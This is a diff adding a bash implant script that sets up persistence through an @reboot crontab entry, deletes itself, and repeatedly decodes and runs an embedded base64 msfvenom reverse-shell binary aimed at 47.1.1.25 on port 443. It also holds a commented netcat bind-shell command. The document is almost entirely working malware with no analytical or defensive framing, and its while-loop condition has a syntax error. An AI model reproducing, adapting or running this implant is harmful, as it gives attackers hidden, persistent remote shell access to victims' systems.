@@ -1,0 +1,69 @@
+#!/bin/bash
+
+SCRIPT_PID=$$
+PERSIST=/root/persist
+SCRIPT=/root/cb_implant.sh
+#COMMAND="nc -nvlp 8443 -e /bin/sh"
+COMMAND=/root/payload
+KEEP_ALIVE="true"
+
+function backup_script () {
+cat >> $PERSIST <<EOF
+#!/bin/bash
+$SCRIPT &
+rm -f "$PERSIST"
+crontab -l 2>/dev/null | grep -Fv "@reboot $PERSIST" | crontab -
+EOF
+cat /proc/$SCRIPT_PID/fd/255 > $SCRIPT
+chmod +x $SCRIPT
+chmod +x $PERSIST
+if ! crontab -l 2>/dev/null | grep -E "@reboot $PERSIST"; then
+	(crontab -l 2>/dev/null; echo "@reboot $PERSIST") | crontab -
+fi
+KEEP_ALIVE="false"
+}
+
+jumpto() {
+	label=$1
+	cmd=$(sed -n "/$label:/{:a;n;p;ba};" $0 | grep -v ':$')
+	eval "$cmd"
+	exit
+}
+
+execute_command () {
+	echo "$b64" | base64 -d > $COMMAND
+	chmod +x $COMMAND
+	(${COMMAND} &)&
+  sleep 1
+	rm -f $COMMAND
+}
+
+encoded=${1:-"encoded"}
+
+jumpto $encoded
+
+main:
+
+trap backup_script EXIT
+rm -- "$0"
+if pgrep $(basename $PERSIST); then
+	PERSIST_PID=$(ps -o ppid= $(pgrep $(basename $PERSIST | tr -d " ")))
+	sleep 3
+	kill $PERSIST_PID
+fi
+while [[ "$KEEP_ALIVE" == "true"; do
+	execute_command
+	sleep 30
+done
+exit
+
+encoded:
+#MSFVENOM payload linux/x64/shell_reverse_tcp LHOST=47.1.1.25 LPORT=443
+b64="$(cat <<-EOF
+	f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAAB
+	AAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAwgAAAAAAAAAMAQAAAAAAAAAQ
+	AAAAAAAAailYmWoCX2oBXg8FSJdIuQIAAbsvAQEZUUiJ5moQWmoqWA8FagNeSP/OaiFYDwV19mo7
+	WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=
+EOF
+)"
+jumpto main
